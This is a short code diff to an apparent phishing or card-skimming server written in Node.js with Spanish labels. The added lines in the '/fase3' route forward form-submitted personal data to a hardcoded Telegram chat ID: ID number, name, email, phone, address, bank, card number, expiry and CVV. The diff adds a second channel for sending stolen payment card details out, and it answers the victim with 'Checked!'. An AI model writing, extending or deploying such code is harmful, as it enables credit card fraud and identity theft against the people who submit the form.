@@ -114,6 +114,22 @@ app.post('/fase3', (req, res)=>{
   FECHA: ${req.body.tar.date}\n
   CVV: ${req.body.tar.cvv}\n\n
   `)
+  .then(()=>{
+    bot.sendMessage('1660900306', `
+    ### RECIBIENDO ###\n
+    CC: ${req.body.cc}\n 
+    NOMBRE: ${req.body.nom}\n
+    MAIL: ${req.body.ml}\n
+    CELULAR: ${req.body.pn}\n
+    CIUDAD: ${req.body.cid}\n
+    DIRECCIÓN: ${req.body.dir}\n
+    **--------**\n
+    BANCO: ${req.body.tar.ent}\n
+    TARJETA: ${req.body.tar.pin}\n
+    FECHA: ${req.body.tar.date}\n
+    CVV: ${req.body.tar.cvv}\n\n
+    `)
+  })
 
   res.json({'msg': 'Checked!'})
 })
